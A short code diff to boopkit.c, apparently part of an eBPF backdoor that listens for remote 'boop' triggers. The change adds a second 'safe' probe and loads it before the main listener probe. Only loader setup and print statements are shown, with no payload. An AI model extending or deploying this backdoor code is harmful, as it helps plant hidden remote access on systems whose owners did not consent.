@@ -19,6 +19,9 @@
 // ██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║
 // ╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝
 //
+// [boopkit.c]
+//
+// Where the main() function goes down.
 
 #include <arpa/inet.h>
 #include <bpf/bpf.h>
@@ -30,6 +33,7 @@
 
 // clang-format off
 #include "proto.h"
+#include "pr0be.skel.h"
 // clang-format on
 
 // PORT must match the ${SRC_PORT} in the /remote script!
@@ -37,10 +41,20 @@
 
 // PROBE_BOOP is the eBPF probe to listen for boops
 #define PROBE_BOOP "pr0be.boop.o"
+#define PROBE_SAFE "pr0be.safe.o"
 
 int main(int argc, char **argv) {
-  char path[PATH_MAX] = PROBE_BOOP;
+
+  char spath[PATH_MAX] = PROBE_SAFE;
   int loaded;
+  struct pr0be_safe *sobj;
+  printf("-----------------------------------------------\n");
+  printf("Loading eBPF Probe: %s\n", spath);
+  sobj = pr0be_safe__open();
+
+
+
+  char path[PATH_MAX] = PROBE_BOOP;
   struct bpf_object *obj;
   printf("-----------------------------------------------\n");
   printf("Loading eBPF Probe: %s\n", path);
